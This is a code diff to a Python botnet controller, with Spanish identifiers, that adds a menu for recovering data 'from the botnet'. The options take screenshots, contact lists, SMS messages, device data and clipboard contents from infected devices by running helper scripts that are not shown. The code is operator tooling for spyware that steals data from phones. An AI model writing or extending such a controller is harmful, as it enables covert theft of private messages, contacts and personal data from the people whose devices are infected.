@@ -31,13 +31,59 @@ def menu():
             seleccionPrimitivas()
             
         if seleccionMenu == 2:
-            seleccionPrimitivas()
+            recuperaData()
             
         if seleccionMenu == 3:
             os.system("python3 botsVivos.py")
             
         if seleccionMenu == 4:
             salir()
+
+################################################ RECUPERA DATA ############################################################
+def recuperaData():
+    print("Please select the information you would like to recover from the botnet:\n")
+    while True:
+        mensajePrimitivas = """
+        (1) get an screenshot
+        (2) get the contact list
+        (3) get the sms list
+        (4) get the device data
+        (5) get Clipboard
+        (6) go back to menu
+        (7) exit
+        """
+        print(mensajePrimitivas)
+        errorSeleccion = "Please use an available integer from the list above\n"
+        print(mensajePrimitivas)
+
+        seleccionMenu = 0
+        while True:
+            try:
+                seleccionMenu = int(input("Option: "))
+                if(not(seleccionMenu>=1 and seleccionMenu<=7)):
+                    raise Exception
+            except:
+                print(errorSeleccion)
+                continue
+            else:
+                break
+            
+        if seleccionMenu == 1:
+            os.system("python3 getCaptura.py")
+        if seleccionMenu == 2:
+            os.system("python3 getContacto.py")
+        if seleccionMenu == 3:
+            os.system("python3 getSms.py")
+        if seleccionMenu == 4:
+            os.system("python3 getDatosdispositivo.py")
+        if seleccionMenu == 5:
+            os.system("python3 getClipboard.py")
+        if seleccionMenu == 6:
+            menu()
+        if seleccionMenu == 7:
+            salir()
+
+        print("Please select more information to get from the botnet")
 
 ################################################ SALIR ############################################################
 
